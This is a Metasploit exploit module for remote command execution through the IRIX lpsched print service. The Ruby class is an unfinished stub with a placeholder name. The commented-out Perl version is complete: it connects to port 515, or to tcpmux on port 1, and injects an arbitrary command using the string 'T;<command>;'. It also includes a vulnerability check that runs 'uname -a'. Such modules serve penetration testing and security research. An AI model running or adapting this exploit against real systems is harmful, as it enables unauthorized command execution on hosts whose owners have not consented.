require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IRIX lpsched Command Execution',
			'Description'    => %q{
				This is YASGIPB (yet another SGI popen bug). This exploit
				requires the ability to bind to a privileged TCP port (less
				than 1024). On most Unix systems, this is only possible when
				you are running as the root user.
					
			},
			'Author'         => [ 'Optyx <optyx@uberhax0r.net>', 'LSD <http://www.lsd-pl.net>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '8573'],
					[ 'URL', 'http://www.lsd-pl.net/code/IRIX/irx_lpsched.c'],
					[ 'MIL', '35'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 4096,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'irix',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Sep 1 2001',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::irix_lpsched_exec;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = {};

my $info = {
	'Name'     => 'IRIX lpsched Command Execution',
	'Version'  => '$Revision$',
	'Authors'  =>
	  [
		'Optyx <optyx [at] uberhax0r.net>',
		'LSD <http://www.lsd-pl.net>'
	  ],
	  
	'Arch'    => [],
	'OS'      => ['irix'],
	'Priv'    => 1,

	'Payload' =>
	  {
		'Space'    => 4096,
		'Keys'     => ['cmd'],
	  },

	'UserOpts' =>
	  {
		'RHOST'  => [1, 'ADDR', 'The target address'],
		'RPORT'  => [1, 'PORT', 'The lpsched target port', 515],
		'TCPMUX' => [0, 'BOOL', 'Use tcpmux to indirectly exploit', 0],
	  },

	'Description' => Pex::Text::Freeform(qq{
      This is YASGIPB (yet another SGI popen bug). This exploit requires 
      the ability to bind to a privileged TCP port (less than 1024). On 
      most Unix systems, this is only possible when you are running as 
      the root user.
}),

	'Refs' =>
	  [
		['OSVDB', '8573'],
		['URL',   'http://www.lsd-pl.net/code/IRIX/irx_lpsched.c'],
		['MIL',   '35'],
	  ],

	'DefaultTarget' => 0,
	'Targets' => [["No Target Needed"]],
	'Keys'  => ['lpd'],

	'DisclosureDate' => 'Sep 1 2001',
  };

sub new {
	my $class = shift;
	my $self  =
	  $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return ($self);
}

sub Check {
	my $self = shift;
	$self->LPDSchedQuery(1);
}

sub Exploit {
	my $self = shift;
	$self->LPDSchedQuery;
}

sub LPDSchedQuery {
	my $self           = shift;
	my $check          = shift;
	my $target_host    = $self->GetVar('RHOST');
	my $target_port    = $self->GetVar('RPORT');
	my $target_tcpmux  = $self->GetVar('TCPMUX');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $command        = $check ? "uname -a;" : $encodedPayload->RawPayload;
	my $s;

	# The TCPMUX service is always on port 1
	if ($target_tcpmux) {
		$target_port = 1;
	}

	$s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
	  );

	if ($s->IsError) {
		$self->PrintLine("[*] Error creating socket: ".$s->GetError);
		return $check ? $self->CheckCode('Connect') : undef;
	}

	if ($target_tcpmux) {
		$s->Send("sgi_printer\n");
		$s->Recv(-1, 30);
	}

	$self->PrintLine("[*] Executing command '$command'");
	$s->Send("T;".$command.";\n");

	if ($check) {

		my $res = $s->Recv(-1, 5);
		$s->Close;

		if ($res =~ /IRIX/) {
			$self->PrintLine("[*] Vulnerable system detected");
			return $self->CheckCode('Confirmed');
		}
		else {
			$self->PrintLine("[*] This system does not appear to be vulnerable");
			return $self->CheckCode('Safe');
		}
	}

	# XXX what response does a patched system give?

	# XXX can we close the socket without killing any running command?
	# $s->Close;

	# XXX should we do one more recv and print the response?
	return;
}

1;

=end


end
end	
